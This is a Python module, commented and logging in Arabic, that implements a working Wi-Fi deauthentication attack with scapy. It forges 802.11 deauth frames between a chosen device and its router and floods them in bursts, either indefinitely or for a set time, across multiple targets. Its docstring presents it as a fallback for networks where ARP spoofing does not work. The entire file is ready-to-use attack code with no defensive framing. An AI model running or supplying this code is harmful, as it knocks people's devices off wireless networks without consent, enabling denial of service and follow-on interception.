"""
محرك هجوم إلغاء المصادقة (Deauth Attack) لشبكات الواي فاي
يستخدم مع الشبكات المفتوحة أو المعزولة (AP Isolation) حيث لا ينفع הـ ARP Spoofing.
"""
import threading
import time
from utils.logger import log

try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False


class DeauthAttack:
    def __init__(self):
        self._active_attacks = {}  # {mac: {"thread": thread, "running": bool, "timer": timer}}
        self._lock = threading.Lock()

    def is_available(self):
        return HAS_SCAPY

    def start_attack(self, target_mac, bssid, iface, duration=-1, on_status=None):
        if not HAS_SCAPY:
            log.error("scapy غير متوفر - لا يمكن بدء هجوم Deauth")
            return False

        if not target_mac or not bssid or not iface:
            log.error("معلومات هجوم Deauth ناقصة (تحتاج MAC الهدف، BSSID الراوتر، واسم الكارت)")
            return False

        target_mac = target_mac.upper()
        bssid = bssid.upper()

        with self._lock:
            if target_mac in self._active_attacks:
                log.warning(f"هجوم Deauth قيد التنفيذ مسبقاً على {target_mac}")
                return False

        log.info(f"بدء هجوم Deauth على {target_mac} من الشبكة {bssid} عبر {iface}")

        attack_info = {"running": True, "thread": None, "timer": None}

        def _deauth():
            try:
                # حزمة طرد من الراوتر للهدف
                pkt_to_target = RadioTap() / Dot11(addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
                # حزمة طرد من الهدف للراوتر (لزيادة الفعالية)
                pkt_to_bssid = RadioTap() / Dot11(addr1=bssid, addr2=target_mac, addr3=bssid) / Dot11Deauth(reason=7)

                if on_status:
                    on_status(target_mac, "disconnected_deauth")

                while attack_info["running"]:
                    # نرسل الحزم بشكل مكثف على دفعات
                    sendp(pkt_to_target, iface=iface, count=10, inter=0.01, verbose=False)
                    sendp(pkt_to_bssid, iface=iface, count=10, inter=0.01, verbose=False)
                    time.sleep(0.5)

                if on_status:
                    on_status(target_mac, "online")

            except Exception as e:
                log.error(f"خطأ في هجوم Deauth لـ {target_mac}: {e}")
                if on_status:
                    on_status(target_mac, "error")

        thread = threading.Thread(target=_deauth, daemon=True)
        attack_info["thread"] = thread

        if duration > 0:
            timer = threading.Timer(duration, lambda: self.stop_attack(target_mac))
            attack_info["timer"] = timer
            timer.start()

        with self._lock:
            self._active_attacks[target_mac] = attack_info
        
        thread.start()
        return True

    def stop_attack(self, target_mac):
        target_mac = target_mac.upper()
        with self._lock:
            if target_mac not in self._active_attacks:
                return False
            attack = self._active_attacks[target_mac]

        attack["running"] = False
        if attack["timer"]:
            attack["timer"].cancel()
        
        if attack["thread"] and attack["thread"].is_alive():
            attack["thread"].join(timeout=3)
            
        with self._lock:
            if target_mac in self._active_attacks:
                del self._active_attacks[target_mac]
                
        log.info(f"تم إيقاف هجوم Deauth على {target_mac}")
        return True

    def stop_all(self):
        with self._lock:
            macs = list(self._active_attacks.keys())
        for mac in macs:
            self.stop_attack(mac)

    def is_attacking(self, target_mac):
        with self._lock:
            return target_mac.upper() in self._active_attacks

    def cleanup(self):
        self.stop_all()
